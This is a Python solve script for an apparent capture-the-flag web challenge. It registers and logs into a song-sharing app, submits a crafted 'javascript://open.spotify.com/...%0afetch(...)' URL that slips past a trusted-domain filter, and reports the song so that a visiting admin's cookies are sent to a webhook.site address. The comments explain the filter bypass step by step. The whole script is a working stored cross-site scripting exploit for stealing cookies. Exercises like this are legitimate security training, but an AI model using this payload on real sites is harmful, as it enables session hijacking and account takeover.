#!/usr/bin/python3
import requests
import sys
import re


USERNAME = "Vego"
PASSWORD = "Password123"
# URL = "http://chall.k1nd4sus.it:30502"
URL = "http://localhost:5000"
HOOK = "https://webhook.site/588c5b95-5858-4fb8-9c16-229e8c48a351"


def solve():
    s = requests.Session()
    data = {'username': USERNAME, 'password': PASSWORD}

    # Register if not already registered
    if len(sys.argv) > 1 and sys.argv[1] == '-r':
        s.post(URL + '/register', data=data)

    s.post(URL + '/login', data=data)


    # By using the "javascript:"" pseudo-protocol, we are telling the browser to interpret everything that follows as code rather than a web address.
    # The "//" is used to mimic the appearance of a standard URL (https://) to bypass simple regex filters that look for "http."
    # In JavaScript, "//" starts a single-line comment. Everything from the first // until the next newline character is ignored by the engine.
    # The browser sees javascript://open.spotify.com... and thinks it's looking at a comment.
    # Filters checking for "trusted domains" see spotify.com and mistakenly mark the string as "safe".
    # The URL-encoded character %0a represents a Line Feed (newline).
    # Since JavaScript comments only last for one line, the %0a ends the comment.
    # The code immediately following the newline—the fetch() command—is now on a "new line" and is executed as active code.
    payload = rf'javascript://open.spotify.com/embed/%0afetch(%27{HOOK}?c=%27%2bdocument.cookie)'

    # Add song with crafted URL
    title = 'pwned'
    data = {'title': title, 'spotify_url': payload}
    s.post(URL + '/add_song', data=data)

    # Get song ID
    res = s.get(URL + '/dashboard')
    song_id = re.search(fr'href="/song/(\d+)">\n\s+{title}\n\s+</a>', res.text).group(1)
    print(song_id)

    # Report song and check the webhook
    data = {'song_id': song_id}
    res = s.post(URL + '/report', data=data)


if __name__ == "__main__":
    solve()
